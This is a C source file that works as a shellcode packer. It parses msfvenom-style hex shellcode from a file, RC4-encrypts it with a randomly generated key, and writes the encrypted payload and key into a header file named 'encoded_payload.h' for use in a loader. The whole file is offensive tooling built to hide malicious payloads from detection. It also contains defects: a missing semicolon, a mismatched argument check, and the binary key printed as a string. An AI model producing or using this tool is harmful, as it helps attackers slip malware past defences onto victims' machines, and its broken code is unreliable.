#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void generate_rc4_key(unsigned char *key, size_t key_length) {
    srand((unsigned int)time(NULL));
    for (size_t i = 0; i < key_length; ++i) {
        key[i] = (unsigned char)(rand() % 256);
    }
}


void rc4_init(unsigned char *s, unsigned char *key, int keylen) {
    int i, j = 0, k;
    unsigned char temp;

    for (i = 0; i < 256; i++) {
        s[i] = i;
    }

    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % keylen]) % 256;
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }
}

void rc4_crypt(unsigned char *s, unsigned char *data, int datalen) {
    int i = 0, j = 0, k, t;
    unsigned char temp;

    for (k = 0; k < datalen; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        t = (s[i] + s[j]) % 256;
        data[k] ^= s[t];
    }
}

void encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *ciphertext) {
    unsigned char s[256];
    memcpy(ciphertext, plaintext, plaintext_len);
    rc4_init(s, key, strlen((char *)key));
    rc4_crypt(s, ciphertext, plaintext_len);
}

unsigned char *read_shellcode(const char *filename, int *length) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("fopen");
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *buffer = malloc(file_size);
    if (!buffer) {
        perror("malloc");
        fclose(file);
        return NULL;
    }

    fread(buffer, 1, file_size, file);
    fclose(file);

    // Find the start of the shellcode
    unsigned char *start = strstr(buffer, "unsigned char buf[] = ");
    if (!start) {
        fprintf(stderr, "Shellcode not found in the file.\n");
        free(buffer);
        return NULL;
    }

    start += strlen("unsigned char buf[] = ");

    // Remove unnecessary characters and convert to raw bytes
    unsigned char *shellcode = malloc(file_size);
    if (!shellcode) {
        perror("malloc");
        free(buffer);
        return NULL;
    }

    int count = 0;
    for (unsigned char *p = start; *p != ';'; p++) {
        if (*p == '\\' && *(p + 1) == 'x') {
            unsigned int byte;
            sscanf(p + 2, "%2x", &byte);
            shellcode[count++] = (unsigned char)byte;
            p += 3;
        }
    }

    free(buffer);
    *length = count;
    return shellcode;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <shellcode file>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *filename = argv[1];
    //unsigned char *key = (unsigned char *)argv[2];

    unsigned char *key;
    int key_length = 16; // For example, 16 bytes for a 128-bit key
    key = (unsigned char *)malloc(key_length);
    generate_rc4_key(key, key_length);


    int plaintext_len;
    unsigned char *plaintext = read_shellcode(filename, &plaintext_len);
    if (!plaintext) {
        return EXIT_FAILURE;
    }

    unsigned char *ciphertext = malloc(plaintext_len);
    if (!ciphertext) {
        perror("malloc");
        free(plaintext);
        return EXIT_FAILURE;
    }

    encrypt(plaintext, plaintext_len, key, ciphertext);

    FILE *f = fopen("encoded_payload.h", "w");
    if (!f) {
        perror("fopen");
        free(plaintext);
        free(ciphertext);
        return EXIT_FAILURE;
    }

    fprintf(f, "#ifndef BUFFER_H\n");
    fprintf(f, "#define BUFFER_H\n\n")

    fprintf(f, "unsigned char key[] = \"%s\";\n", key);
    fprintf(f, "unsigned char buf[] = \n\"");
    for (int i = 0; i < plaintext_len; i++) {
        fprintf(f, "\\x%02x", ciphertext[i]);
        if ((i + 1) % 16 == 0 && i != plaintext_len - 1) {
            fprintf(f, "\"\n\"");
        }
    }

    fprintf(f, "\";\n");
    fprintf(f,"#define BUF_SIZE sizeof(buf)\n");
    fprintf(f,"#endif\n");


    fclose(f);

    free(key);
    free(plaintext);
    free(ciphertext);

    return 0;
}
